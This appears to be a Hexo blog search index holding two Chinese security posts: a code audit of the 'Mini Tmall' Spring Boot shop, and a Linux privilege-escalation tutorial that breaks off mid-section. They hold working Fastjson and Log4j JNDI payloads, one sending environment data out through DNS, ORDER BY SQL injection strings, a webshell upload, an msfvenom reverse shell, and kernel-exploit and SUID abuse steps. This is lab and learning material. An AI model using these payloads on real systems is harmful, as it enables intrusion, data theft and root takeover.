<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>迷你天猫商城代码审计</title>
    <link href="/2024/06/24/%E8%BF%B7%E4%BD%A0%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2024/06/24/%E8%BF%B7%E4%BD%A0%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="迷你天猫商城代码审计"><a href="#迷你天猫商城代码审计" class="headerlink" title="迷你天猫商城代码审计"></a>迷你天猫商城代码审计</h1><h1 id="1-项目简介"><a href="#1-项目简介" class="headerlink" title="1.项目简介"></a>1.项目简介</h1><p>迷你天猫商城是一个基于Spring Boot的综合性B2C电商平台，需求设计主要参考天猫商城的购物流程：用户从注册开始，到完成登录，浏览商品，加入购物车，进行下单，确认收货，评价等一系列操作。 作为迷你天猫商城的核心组成部分之一，天猫数据管理后台包含商品管理，订单管理，类别管理，用户管理和交易额统计等模块，实现了对整个商城的一站式管理和维护。</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>java:1.8</p><p>mysql:5.7.26</p><h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><p>创建tmalldemodb数据库，source tmalldemodb.sql导入sql文件</p><p>修改application.properties文件中的端口与数据库连接密码</p><img src="/img/image-20240624135111737.png" alt="image-20240624135111737" style="zoom:67%;" /> <ul><li>前台地址：<a href="http://localhost:8080/tmall">http://localhost:8080/tmall</a></li><li>后台地址：<a href="http://localhost:8080/tmall/admin">http://localhost:8080/tmall/admin</a></li></ul><p>admin&#x2F;123456</p><p><img src="/img/image-20240624135622536.png" alt="image-20240624135622536"></p><h1 id="2-代码审计与漏洞验证"><a href="#2-代码审计与漏洞验证" class="headerlink" title="2.代码审计与漏洞验证"></a>2.代码审计与漏洞验证</h1><h2 id="组件漏洞"><a href="#组件漏洞" class="headerlink" title="组件漏洞"></a>组件漏洞</h2><p>从 pom.xml 文件开始审计引入的第三方组件是否存在漏洞版本，然后进一步验证该组件是否存在漏洞点  </p><p><a href="https://mvnrepository.com/">https://mvnrepository.com/</a> 可从这里直接搜，可看到相应版本是否有一些已知漏洞</p><p><img src="/img/image-20240624143929328.png" alt="image-20240624143929328"></p><table><thead><tr><th>组件名称</th><th>组件版本</th></tr></thead><tbody><tr><td>SpringBoot</td><td>2.1.6.RELEASE</td></tr><tr><td>Fastjson</td><td>1.2.58</td></tr><tr><td>Mysql</td><td>5.1.47</td></tr><tr><td>Druid</td><td>1.1.19</td></tr><tr><td>Taglibs</td><td>1.2.5</td></tr><tr><td>Mybatis</td><td>3.5.1</td></tr><tr><td>Log4j</td><td>2.10.0</td></tr></tbody></table><h3 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h3><p>Fastjson版本为1.2.58，该版本存在反序列化漏洞  </p><p>Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java对象之间相互转换。两个主要接口是JSON.toJSONString和JSON.parseObject&#x2F;JSON.parse，分别实现序列化和反序列化操作</p><p>Fastjson反序列化漏洞简单来说是出现在将JSON数据反序列化过程中出现的漏洞。攻击者可以传入一个恶意构造的JSON内容，程序对其进行反序列化后得到恶意类并执行了恶意类中的恶意函数，进而导致代码执行</p><p>已确定了Fastjson版本存在问题，进一步寻找触发Fastjson的漏洞点。关注两个函数 JSON.parse()和 JSON.parseObject()</p><h4 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h4><p>全局搜索发现项目中存在JSON.parseObject</p><img src="/img/image-20240624141034627.png" alt="image-20240624141034627" style="zoom:50%;" /> <p>ProductController.java中151行  反序列化了propertyJson参数</p><p><img src="/img/image-20240624141320334.png" alt="image-20240624141320334"></p><p>跟一下propertyJson参数。</p><p><strong>发现漏洞触发点为添加产品信息接口，可控参数为产品属性</strong>  </p><p><img src="/img/image-20240624141645784.png" alt="image-20240624141645784"></p><h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><p>使用burp抓取接口，找到响应的可控参数propertJson</p><p><img src="/img/image-20240624154552019.png" alt="image-20240624154552019"></p><p>decoder解码</p><img src="/img/image-20240624154647099.png" alt="image-20240624154647099" style="zoom:67%;" /> <p>为json格式的字符串</p><p><strong>出网漏洞验证</strong></p><p>dnslog地址：dnslog.org</p><p>74ae5a0e.log.dnslog.biz.</p><p>构造漏洞验证POC</p><p>{“@type”:”java.net.Inet4Address”,”val”:”666.74ae5a0e.log.dnslog.biz.”} </p><p><img src="/img/image-20240624155030204.png" alt="image-20240624155030204"></p><p><img src="/img/image-20240624154950754.png" alt="image-20240624154950754"></p><p>证明漏洞存在</p><p>其他漏洞验证poc：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;zeo&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.Inet4Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;&#125;<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.Inet4Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.Inet6Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.InetSocketAddress&quot;</span>&#123;<span class="hljs-string">&quot;address&quot;</span>:,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;&#125;<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>, &#123;<span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.net.URL&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;&#125;<span class="hljs-string">&quot;&quot;</span>&#125;<br>&#123;&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.URL&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;:<span class="hljs-string">&quot;aaa&quot;</span>&#125;<br>Set[&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.URL&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;]<br>Set[&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.URL&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;<br>&#123;&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.URL&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="log4j"><a href="#log4j" class="headerlink" title="log4j"></a>log4j</h3><p>本项目引入的Log4j版本为2.10.0，该版本存在远程代码执行漏洞  （CVE-2021-44228）</p><p>Log4j是Apache的一个开源项目，通过使用Log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。最令人感兴趣的就是，这些可以通过一个配置文件来灵活地进行配置，而不需要修改应用的代码  </p><p>由于Apache Log4j2</p><p>某些功能存在递归解析，攻击者可在未经身份验证的情况下构造发送带有攻击语句的数据请求包，最终造成在目标服务器上执行任意代码。其中涉及到的lookup的主要功能就是提供另外一种方式以添加某些特殊的值到日志中，以最大化松散耦合地提供可配置属性供使用者以约定的格式进行调用</p><h4 id="审计-1"><a href="#审计-1" class="headerlink" title="审计"></a>审计</h4><p>该组件漏洞主要发生在引入的 log4j-core ， log4j-api 是不存在该问题的。 log4j-core 是源码， log4j-api 是接口 </p><p>pom.xml 文件引入Log4j组件情况如下图所示，引入了 log4j-core ，以及版本为 2.10.0 。基本确定存在问题，验证还需进一步寻找能触发的漏洞点。</p><img src="/img/image-20240624142211895.png" alt="image-20240624142211895" style="zoom:50%;" /> <p>全局搜索关键字 logger ，本项目使用 logger.info 级别记录日志方式居多  </p><img src="/img/image-20240624142531887.png" alt="image-20240624142531887" style="zoom:67%;" /> <p>发现有几处日志记录拼接了变量参数 ，以获取图片原始文件名为例</p><p>发现漏洞触发点：com&#x2F;xq&#x2F;tmall&#x2F;controller&#x2F;admin&#x2F;AccountController.java</p><p><strong>管理员头像上传接口处 ，获取上传头像的图片原始文件名作为赋值给originalfilename</strong></p><p>利用方式：访问管理员头像上传功能，将文件名改为攻击语句，即可触发Log4j漏洞  </p><p><img src="/img/image-20240624142958707.png" alt="image-20240624142958707"></p><h4 id="验证-1"><a href="#验证-1" class="headerlink" title="验证"></a>验证</h4><p>漏洞利用详解：<a href="https://github.com/jas502n/Log4j2-CVE-2021-44228">https://github.com/jas502n/Log4j2-CVE-2021-44228</a></p><p><strong>出网漏洞验证</strong></p><p>使用burp抓取头像上传接口</p><p><img src="/img/image-20240624155423054.png" alt="image-20240624155423054"></p><p>获取dnslog地址</p><p>ef880d2e.log.dnslog.biz.</p><p>构造漏洞验证POC： ${jndi:ldap:&#x2F;&#x2F;666.ef880d2e.log.dnslog.biz.}   </p><p>放在filename字段测试：</p><p><img src="/img/image-20240624155805512.png" alt="image-20240624155805512"></p><p>验证成功 漏洞存在</p><p><strong>出网外带信息验证</strong></p><p>Log4j处理 ${} 是采用递归方式解析。也就是说有几个 ${} 表达式，就使用对应的Lookup解析几个。因此，我们可以配合使用DNSLog来进行信息外带。具体操作如下  </p><p>攻击POC： ${jndi:ldap:&#x2F;&#x2F;${env:OS}.ef880d2e.log.dnslog.biz.} </p><p>将其粘贴到上传头像数据包中的filename处</p><p><img src="/img/image-20240624160025956.png" alt="image-20240624160025956"> </p><p><strong>jndi注入验证</strong></p><p>利用工具 JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar  </p><p>命令 java -jar JNDI-Injection-Exploit-1.0-SNAPSHOTall.jar -C “calc” （ -C 远程class文件中要执行的命令。本例子为弹计算器 ）  </p><p><img src="/img/image-20240624160600272.png" alt="image-20240624160600272"></p><p>根据相应的环境选择poc</p><p><img src="/img/image-20240624160654480.png" alt="image-20240624160654480"></p><h2 id="单点漏洞"><a href="#单点漏洞" class="headerlink" title="单点漏洞"></a>单点漏洞</h2><p>对于单点功能代码审计除了特定漏洞存在特定代码审计方法，一般可先去看一遍Controller层代码，了解基本功能。再从功能出发进行代码审计</p><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>本项目使用了Mybatis，来定义SQL。我们主要查看Myabatis中 xxxMapper.xml 文件中是否存在使用$ 拼接SQL语句的情况。使用 $ 是直接拼接SQL语句的，未进行转义。  </p><h4 id="审计-2"><a href="#审计-2" class="headerlink" title="审计"></a>审计</h4><p>全局搜索关键字 $ ，确实存在几处 order by 使用了 $ 拼接SQL语句，因为 order by 是没办法使用 #{}的</p><img src="/img/image-20240624144255069.png" alt="image-20240624144255069" style="zoom:67%;" /> <p>下载free mybatis tool 可以点击绿色箭头快速从mapper.xml文件中跳转到相应的dao层代码处</p><p><img src="/img/image-20240624145234590.png" alt="image-20240624145234590"></p><p>来到dao层文件</p><p><img src="/img/image-20240624145736905.png" alt="image-20240624145736905"></p><p>继续追踪select–》service层</p><p><img src="/img/image-20240624145923205.png" alt="image-20240624145923205"></p><p>service接口–》controller层 userController.java</p><p><img src="/img/image-20240624150505733.png" alt="image-20240624150505733"></p><p>orderUtil对象有两个属性</p><img src="/img/image-20240624150549380.png" alt="image-20240624150549380" style="zoom:50%;" /> <p>sql语句中是根据orderutil的orderby参数来排序，所以关注orderby是如何传入的</p><p><img src="/img/image-20240624151045322.png" alt="image-20240624151045322"></p><p>漏洞触发点：</p><p>接口：按条件查询用户处  admin&#x2F;user&#x2F;{index}&#x2F;{count}</p><p>可控参数：orderBy</p><h4 id="验证-2"><a href="#验证-2" class="headerlink" title="验证"></a>验证</h4><p>使用burp抓取接口测试，输入单引号，出现异常</p><p><img src="/img/image-20240624151743562.png" alt="image-20240624151743562"></p><p>测试语句（符号需要url编码）：</p><p><a href="https://govuln.com/tool/decoder/">https://govuln.com/tool/decoder/</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>,if((<span class="hljs-number">1</span>=<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,(select <span class="hljs-number">1</span> union select <span class="hljs-number">2</span>))<br><span class="hljs-attribute">1</span>,if((<span class="hljs-number">1</span>=<span class="hljs-number">2</span>),<span class="hljs-number">1</span>,(select <span class="hljs-number">1</span> union select <span class="hljs-number">2</span>))<br></code></pre></td></tr></table></figure><p>其他测试语句</p><p>1.使用rand函数结果显示排序方式不同  </p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">orderBy</span><span class="hljs-operator">=</span>rand(<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>)<br><span class="hljs-attribute">orderBy</span><span class="hljs-operator">=</span>rand(<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>2.利用regexp（正则表达式）  </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">orderBy</span>=(select+<span class="hljs-number">1</span>+regexp+if(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>x00)) 正常<br><span class="hljs-attribute">orderBy</span>=(select+<span class="hljs-number">1</span>+regexp+if(<span class="hljs-number">1</span>=<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>x00)) 错误<br></code></pre></td></tr></table></figure><p>3.利用updatexml（更新选定XML片段的内容）  </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">orderBy</span>=updatexml(<span class="hljs-number">1</span>,if(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,user()),<span class="hljs-number">1</span>) 正确<br><span class="hljs-attribute">orderBy</span>=updatexml(<span class="hljs-number">1</span>,if(<span class="hljs-number">1</span>=<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,user()),<span class="hljs-number">1</span>) 错误<br></code></pre></td></tr></table></figure><p>4.利用extractvalue（从目标XML中返回包含所查询值的字符串）  </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">orderBy</span>=extractvalue(<span class="hljs-number">1</span>,if(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,user())) 正确<br><span class="hljs-attribute">orderBy</span>=extractvalue(<span class="hljs-number">1</span>,if(<span class="hljs-number">1</span>=<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,user())) 错误<br></code></pre></td></tr></table></figure><p>5.时间盲注  </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">orderBy</span>=if(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,(SELECT(<span class="hljs-number">1</span>)FROM(SELECT(SLEEP(<span class="hljs-number">2</span>)))test)) 正常响应时间<br><span class="hljs-attribute">orderBy</span>=if(<span class="hljs-number">1</span>=<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,(SELECT(<span class="hljs-number">1</span>)FROM(SELECT(SLEEP(<span class="hljs-number">2</span>)))test)) sleep <span class="hljs-number">2</span>秒<br></code></pre></td></tr></table></figure><p><img src="/img/image-20240624161601058.png" alt="image-20240624161601058"></p><p>使用sqlmap</p><p>orderby参数处加*，保存为txt文件使用sqlmap进行测试</p><p><img src="/img/image-20240624161949709.png" alt="image-20240624161949709"></p><h3 id="xss漏洞"><a href="#xss漏洞" class="headerlink" title="xss漏洞"></a>xss漏洞</h3><h4 id="审计-3"><a href="#审计-3" class="headerlink" title="审计"></a>审计</h4><p>从开发视角来看防护XSS漏洞，大多是过滤&#x2F;转义用户的输入和输出。对于开发人员来说，不可能对每一个输入和输出点进行过滤&#x2F;转义。一般常使用filter层（过滤器）或拦截器进行统一过滤 ，或者所使用的前端框架自带防XSS机制 。所以，<strong>审计XSS漏洞第一步看看filter层是否存在XSS过滤代码</strong>。对本项目审计发现filter层并没有关于防护XSS的代码  </p><p><img src="/img/image-20240624152801634.png" alt="image-20240624152801634"></p><p>filter中只做了权限校验相关的检测</p><p>第二步，看看使用的前端框架是什么，版本是多少，以及是否存在防XSS漏洞机制。经过一番查找，发现pom.xml和webapp文件下，都表明使用了传统的JSP。JSP大多配合Filter进行XSS防护，上述我们发现filter层并没有XSS防护机制  </p><p>那么本项目应该存在xss漏洞</p><h4 id="验证-3"><a href="#验证-3" class="headerlink" title="验证"></a>验证</h4><p>见框就可尝试插xss</p><img src="/img/image-20240624162102926.png" alt="image-20240624162102926" style="zoom:50%;" /> <img src="/img/image-20240624162134038.png" alt="image-20240624162134038" style="zoom:67%;" /> <h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><p>对于代码审计任意文件上传漏洞来说，首先是看看是否存在文件上传功能，然后进一步审计是否存在任意文件上传漏洞。  或者搜索相关关键字，文件上传关键字如下：  </p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">File<br>FileUpload<br>FileUploadBase<br>FileItemIteratorImpl<br>FileItemStreamImpl<br>FileUtils<br>UploadHandleServlet<br>FileLoadServlet<br>FileOutputStream<br><span class="hljs-keyword">DiskFileItemFactory</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">MultipartRequestEntity</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">MultipartFile</span><br><span class="hljs-keyword"></span>com.<span class="hljs-keyword">oreilly.servlet.MultipartRequest</span><br></code></pre></td></tr></table></figure><p>对于 SpingBoot项目来说，想要SpringBoot内嵌的Tomcat对JSP解析，一定要引入相关依赖。如下图所示  </p><img src="/img/image-20240624153320989.png" alt="image-20240624153320989" style="zoom:50%;" /> <p>对于很多SpringBoot项目来说，是无需引入解析JSP依赖的。那么对于任意文件上传漏洞来说，上传JSP木马肯定是没有办法解析的。对于任意文件上传漏洞利用，只能通过内存马等方式进行攻击了  </p><h4 id="审计-4"><a href="#审计-4" class="headerlink" title="审计"></a>审计</h4><p>审计上述log4j漏洞处的管理员头像上传功能</p><p><img src="/img/image-20240624153629578.png" alt="image-20240624153629578"></p><p>直接提取上传文件后缀与生成的uuid拼接，对文件类型没有任何限制，并且上传到指定的目录中</p><p>用ai分析可能存在的问题：</p><p><img src="/img/image-20240624153934442.png" alt="image-20240624153934442"></p><p>存在任意文件上传漏洞</p><h4 id="验证-4"><a href="#验证-4" class="headerlink" title="验证"></a>验证</h4><p>直接上传冰蝎马验证</p><p><img src="/img/image-20240624162724766.png" alt="image-20240624162724766"></p><p><img src="/../../../%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/md%E6%96%87%E4%BB%B6%E5%9B%BE%E7%89%87%E5%AD%98%E6%94%BE/image-20240624162820924.png" alt="image-20240624162820924"></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>提权-linux提权</title>
    <link href="/2024/01/10/%E6%8F%90%E6%9D%83-linux%E6%8F%90%E6%9D%83/"/>
    <url>/2024/01/10/%E6%8F%90%E6%9D%83-linux%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h1 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h1><h2 id="1-linux内核提权"><a href="#1-linux内核提权" class="headerlink" title="1.linux内核提权"></a>1.linux内核提权</h2><h3 id="提权原理"><a href="#提权原理" class="headerlink" title="提权原理"></a>提权原理</h3><p>内核提权是利用Linux内核的漏洞进行提权的。内核漏洞进行提权一般包括三个环节： </p><p>1、对目标系统进行信息收集，获取到系统内核信息以及版本信息； </p><p>2、根据内核版本获取其对应的漏洞以及EXP； </p><p>3、使用找到的EXP对目标系统发起攻击，完成提权操作 </p><ul><li>查看Linux操作系统的内核版本和相关信息</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/issue 查看ubuntu或者centos的版本<br><span class="hljs-built_in">cat</span> /etc/*-release 查看centos版本<br><span class="hljs-built_in">uname</span> -a 查看系统全部信息<br><span class="hljs-built_in">uname</span> -r 查看内核版本<br></code></pre></td></tr></table></figure><p><img src="/img/image-20240110132524931.png" alt="image-20240110132524931"></p><p>EXP可以用kali去寻找，kali中自带searchsploit命令可以查找EXP</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">searchspolit linux xxx</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20240110132600977.png" alt="image-20240110132600977"> </p><p><img src="/img/image-20240110132613436.png" alt="image-20240110132613436"></p><p>复制利用脚本到当前目录</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">searchsploit</span> -m <span class="hljs-number">42887</span>.c<br></code></pre></td></tr></table></figure><p><img src="/img/image-20240110132743625.png" alt="image-20240110132743625"></p><p>去互联网搜索该脚本的用法和相关的文档</p><h3 id="提权复现"><a href="#提权复现" class="headerlink" title="提权复现"></a>提权复现</h3><p>环境：本次实验使用Ubuntu 20.04,内核版本是5.10版本的</p><p><img src="/img/image-20240110133358478.png" alt="image-20240110133358478"> </p><p>使用MSF上线机器</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p linux/x64/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.41.211 <span class="hljs-attribute">LPORT</span>=8888 -f<br>elf &gt; mshell.elf<br><br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload linux/x64/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> lhost 192.168.41.211<br><span class="hljs-built_in">set</span> lport 8888<br>run<br></code></pre></td></tr></table></figure><p>查看权限，较低：</p><img src="/img/image-20240110133552584.png" alt="image-20240110133552584" style="zoom:67%;" /> <p>查看操作系统</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/etc/i</span>ssue<br>cat <span class="hljs-regexp">/etc/</span>*-release<br></code></pre></td></tr></table></figure><img src="/img/image-20240110133442560.png" alt="image-20240110133442560" style="zoom:67%;" /> <p>查看可以利用的内核版本提权漏洞</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">searchsploit</span> linux <span class="hljs-number">5</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20240110133522227.png" alt="image-20240110133522227"></p><p>将脚本进行复制并且只用GCC进行编译，或者使用百度搜索相关的文档进行使用</p><img src="/img/image-20240110134033077.png" alt="image-20240110134033077" style="zoom: 67%;" /> <p>使用gcc进行编译</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gcc</span> -o test11 <span class="hljs-number">50808</span>.c<br></code></pre></td></tr></table></figure><p>执行</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/test11 /u</span>sr<span class="hljs-regexp">/bin/</span>su<br></code></pre></td></tr></table></figure><img src="/img/image-20240110133529493.png" alt="image-20240110133529493" style="zoom:67%;" /> <h2 id="2-SUID提权"><a href="#2-SUID提权" class="headerlink" title="2.SUID提权"></a>2.SUID提权</h2><h3 id="SUID介绍"><a href="#SUID介绍" class="headerlink" title="SUID介绍"></a>SUID介绍</h3><p>SUID是一种特殊权限，设置了suid的程序文件，<strong>在用户执行该程序时，用户的权限是该程序文件属主的权限</strong>，例如程序文件的属主是root，那么执行该程序的用户就将暂时获得root账户的权限。sgid与suid 类似，只是执行程序时获得的是文件属组的权限。passwd这个命令程序的权限设置，它就是设置了 suid权限的</p><p><img src="/img/image-20240110134325519.png" alt="image-20240110134325519"></p><p>注意以下几点： </p><p>1.只有可以执行的二进制程序文件才能设定SUID权限,非二进制文件设置SUID权限没任何意义</p><p>2.命令执行者要对该程序文件拥有执行(x)权限.</p><p>3.命令执行者在执行该程序时获得该程序文件属主的身份.</p><p>4.SUID权限只在该程序执行过程中有效,也就是说身份改变只在程序执行过程中有效</p><h3 id="设置SUID"><a href="#设置SUID" class="headerlink" title="设置SUID"></a>设置SUID</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> u+s filename 设置SUID位<br><span class="hljs-built_in">chmod</span> u-s filename 去掉SUID设置<br></code></pre></td></tr></table></figure><h4 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h4><p>普通用户无法查看shadow文件</p><p><img src="/img/image-20240110135339662.png" alt="image-20240110135339662"> </p><p>如果root给cat设置了suid权限，则普通用户可以使用cat查看shadow文件</p><p><img src="/img/image-20240110135533443.png" alt="image-20240110135533443"> </p><h3 id="SUID提权原理"><a href="#SUID提权原理" class="headerlink" title="SUID提权原理"></a>SUID提权原理</h3><p>原理：利用某些二进制文件设置了SUID权限，从而用root权限执行系统命令</p><p>常见的可以用来提权的命令如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk">nmap<br>vim<br>find<br>bash<br>more<br>less<br>nano<br>cp<br>awk<br>mv<br>更多命令查看：https:<span class="hljs-regexp">//g</span>tfobins.github.io<span class="hljs-regexp">/gtfobins/</span>awk/<span class="hljs-comment">#suid</span><br></code></pre></td></tr></table></figure><h3 id="查找SUID文件"><a href="#查找SUID文件" class="headerlink" title="查找SUID文件"></a>查找SUID文件</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-built_in">find</span> / -user root -perm -4000 -exec ls &#123;&#125; \; 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p>一、 find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null </p><p>1、find 是查找文件的命令 </p><p>2、&#x2F; 是从根目录开始查找 </p><p>3、-user root 是文件的所属者是root </p><p>4、-perm -4000</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-perm匹配权限</span><br>4000 2000 1000分别表示SUID SGID 